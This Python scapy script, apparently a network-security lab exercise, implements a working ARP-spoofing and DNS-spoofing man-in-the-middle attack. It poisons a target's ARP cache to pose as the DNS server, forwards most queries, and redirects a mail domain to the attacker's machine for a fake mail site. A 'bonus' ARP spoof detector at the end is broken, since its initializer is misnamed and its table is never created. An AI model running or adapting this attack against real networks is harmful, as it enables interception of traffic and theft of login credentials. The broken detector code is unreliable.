from typing import Dict, List
import multiprocessing as mp
import time

import scapy.all as scapy
from scapy.all import Ether, ARP, DNS, DNSQR, DNSRR, IP, UDP, getmacbyip
# from self import self

DOOFENSHMIRTZ_IP = "10.0.2.15"  # Enter the computer you attack's IP.
SECRATERY_IP = "10.0.2.16"  # Enter the attacker's IP.
NETWORK_DNS_SERVER_IP = "10.0.2.43"  # Enter the network's DNS server's IP.
SPOOF_SLEEP_TIME = 2

IFACE = "eth0"

FAKE_GMAIL_IP = SECRATERY_IP  # The ip on which we run
DNS_FILTER = f"udp port 53 and ip src {DOOFENSHMIRTZ_IP} and ip dst {NETWORK_DNS_SERVER_IP}"  # Scapy filter
REAL_DNS_SERVER_IP = "8.8.8.8"  # The server we use to get real DNS responses.
SPOOF_DICT = {  # This dictionary tells us which host names our DNS server needs to fake, and which ips should it give.
    b"mail.doofle.com": FAKE_GMAIL_IP
}


class ArpSpoofer(object):
    """
    An ARP Spoofing process. Sends periodical ARP responses to given target
    in order to convince it we are a specific ip (e.g: default gateway).
    """

    def __init__(self,
                 process_list: List[mp.Process],
                 target_ip: str, spoof_ip: str) -> None:
        """
        Initializer for the arp spoofer process.
        @param process_list global list of processes to append our process to.
        @param target_ip ip to spoof
        @param spoof_ip ip we want to convince the target we have.
        """
        process_list.append(self)
        self.process = None

        self.target_ip = target_ip
        self.spoof_ip = spoof_ip
        self.target_mac = None
        self.spoof_count = 0

    def get_target_mac(self) -> str:
        """
        Returns the mac address of the target.
        If not initialized yet, sends an ARP request to the target and waits for a response.
        @return the mac address of the target.
        """
        "send ARP request to target and wait for response to get the mac address"
        if self.target_mac is None:
            mac = getmacbyip(self.target_ip)
            self.target_mac = mac
        return self.target_mac

    def spoof(self) -> None:
        """
        Sends an ARP spoof that convinces target_ip that we are spoof_ip.
        Increases spoof count by one.
        """
        target_mac = self.get_target_mac()
        spoof_packet = ARP(op=2, psrc=self.spoof_ip, pdst=self.target_ip, hwdst=target_mac)
        scapy.send(spoof_packet, iface=IFACE, verbose=False)
        self.spoof_count += 1

    def run(self) -> None:
        """
        Main loop of the process.
        """
        while True:
            self.spoof()
            time.sleep(SPOOF_SLEEP_TIME)

    def start(self) -> None:
        """
        Starts the ARP spoof process.
        """
        p = mp.Process(target=self.run)
        self.process = p
        self.process.start()


class DnsHandler(object):
    """
    A DNS request server process. Forwards some of the DNS requests to the
    default servers. However for specific domains this handler returns fake crafted
    DNS responses.
    """

    def __init__(self,
                 process_list: List[mp.Process],
                 spoof_dict: Dict[str, str]):
        """
        Initializer for the dns server process.
        @param process_list global list of processes to append our process to.
        @param spoof_dict dictionary of spoofs.
            The keys: represent the domains we wish to fake,
            The values: represent the fake responses we want
                        from the domains.
        """
        process_list.append(self)
        self.process = None

        self.spoof_dict = spoof_dict
        self.real_dns_server_ip = REAL_DNS_SERVER_IP

    def get_real_dns_response(self, pkt: scapy.packet.Packet) -> scapy.packet.Packet:
        """
        Returns the real DNS response to the given DNS request.
        Asks the default DNS servers (8.8.8.8) and forwards the response, only modifying
        the IP (change it to local IP).

        @param pkt DNS request from target.
        @return DNS response to pkt, source IP changed.
        """
        dns_req = scapy.IP(dst=self.real_dns_server_ip) / pkt[scapy.UDP] / pkt[scapy.DNS]
        # sends our packet to the real dns server and wait up to 2 seconds for a response
        real_response = scapy.sr1(dns_req, timeout=2, verbose=False)
        if real_response is None:
            return None
        real_response[IP].src = SECRATERY_IP
        return real_response

    def get_spoofed_dns_response(self, pkt: scapy.packet.Packet, to: str) -> scapy.packet.Packet:
        """
        Returns a fake DNS response to the given DNS request.
        Crafts a DNS response leading to the ip adress 'to' (parameter).

        @param pkt DNS request from target.
        @param to ip address to return from the DNS lookup.
        @return fake DNS response to the request.
        """
        spoof_response = DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, an=DNSRR(rrname=pkt[DNSQR].qname, rdata=to))
        return spoof_response
 
    def resolve_packet(self, pkt: scapy.packet.Packet) -> str:
        """
        Main handler for DNS requests. Based on the spoof_dict, decides if the packet
        should be forwarded to real dns server or should be treated with a crafted response.
        Calls either get_real_dns_response or get_spoofed_dns_response accordingly.

        @param pkt DNS request from target.
        @return string describing the choice made
        """
        dns_req = pkt[DNS]
        qname = dns_req.qd.qname
        if qname in self.spoof_dict:
            fake_ip = self.spoof_dict[qname]
            response_pkt = self.get_spoofed_dns_response(pkt, to=fake_ip)
            log_msg = f"[SPOOFED] Redirected {qname} to {fake_ip}"
        else:
            response_pkt = self.get_real_dns_response(pkt)
            log_msg = f"[FORWARDED] Resolved real IP for {qname}"
        # Send the constructed response packet back to the network if successful
        if response_pkt:
            scapy.send(response_pkt, verbose=False)
            return log_msg
        return "[IGNORED] Not a valid DNS request layer"

    def run(self) -> None:
        """
        Main loop of the process. Sniffs for packets on the interface and sends DNS
        requests to resolve_packet. For every packet which passes the filter, self.resolve_packet
        is called and the return value is printed to the console.
        """
        while True:
            try:
                scapy.sniff(filter=DNS_FILTER, prn=self.resolve_packet)
            except:
                import traceback
                traceback.print_exc()

    def start(self) -> None:
        """
        Starts the DNS server process.
        """
        p = mp.Process(target=self.run)
        self.process = p
        self.process.start()

class ArpSpoofDetector(object):
    """
    Bonus: Detects ARP spoofing attacks by monitoring ARP replies.
    Maintains a table of known IP->MAC mappings and alerts when a mapping changes,
    which indicates a potential ARP spoof attack.
    """
    def init(self):
        # Known ARP table: IP -> MAC
        self.arp_table = {}
        # Track suspicious MACs for attacker identification
        self.suspicious_macs = set()

    def get_real_mac(self, ip: str) -> str:
        """
        Sends an ARP request to verify the real MAC for a given IP.

        what we do:
        1. ask every device on the network "who has this ip?"
        2. wait for reply
        3. return MAC if there is one
        """
        arp_request = ARP(op=1, pdst=ip) # op =1 is request
        ether = Ether(dst="ff:ff:ff:ff:ff:ff")  # broadcast every MAC address
        response = scapy.srp(ether / arp_request, timeout=2, verbose=False, iface=IFACE)[0]
        if response:
            return response[0][1].hwsrc
        return None

    def detect_spoof(self, pkt: scapy.packet.Packet) -> None:
        """
        Callback for sniffed ARP packets. Checks if the source IP already has
        a known MAC. If the MAC changed, it flags a spoofing attempt and tries
        to identify the attacker.

        what we do:
        1. check if packet is reply (op=2)
        2. get source IP and MAC
        3. check if IP is already in our table
        4. if yes and MAC changed -> flag spoof
        5. if no -> add to table
        """
        if pkt[ARP].op != 2:  # op = 2 is reply (that ip is at this mac)
            return

        src_ip = pkt[ARP].psrc
        src_mac = pkt[ARP].hwsrc

        if src_ip in self.arp_table:
            known_mac = self.arp_table[src_ip]
            if known_mac != src_mac:
                print(f"\n ARP SPOOF DETECTED!")
                print(f"    IP {src_ip} changed MAC from {known_mac} to {src_mac}")
                print(f"    Potential attacker MAC: {src_mac}")
                self.suspicious_macs.add(src_mac)
                # Try to find the attacker's real IP
                self.find_attacker(src_mac)
        else:
            self.arp_table[src_ip] = src_mac
            print(f"Learned: {src_ip} -> {src_mac}")

    def find_attacker(self, suspicious_mac: str) -> None:
        """
        Given a suspicious MAC address, scans the local network to find
        which IP truly belongs to that MAC.

        what we do:
        1. ask every device on the network "who has this mac?"
        2. wait for reply
        3. return IP if there is one
        """
        print(f"Scanning network to find real IP of attacker MAC {suspicious_mac}...")
        # Send ARP requests to the local subnet
        arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, pdst="10.0.2.0/24")
        responses = scapy.srp(arp_request, timeout=3, verbose=False, iface=IFACE)[0]
        for sent, received in responses:
            if received.hwsrc == suspicious_mac:
                print(f"Attacker's real IP is likely: {received.psrc} (MAC: {received.hwsrc})")
                return
        print(f"Could not determine attacker's real IP")

    def run(self) -> None:
        """
        Main loop: sniffs ARP replies on the network interface.
        """
        print("ARP Spoof Detector started. Monitoring ARP traffic...")
        scapy.sniff(filter="arp", prn=self.detect_spoof, iface=IFACE, store=0)

if __name__ == "__main__":
    plist = []
    spoofer = ArpSpoofer(plist, DOOFENSHMIRTZ_IP, NETWORK_DNS_SERVER_IP)
    server = DnsHandler(plist, SPOOF_DICT)

    print("Starting sub-processes...")
    server.start()
    spoofer.start()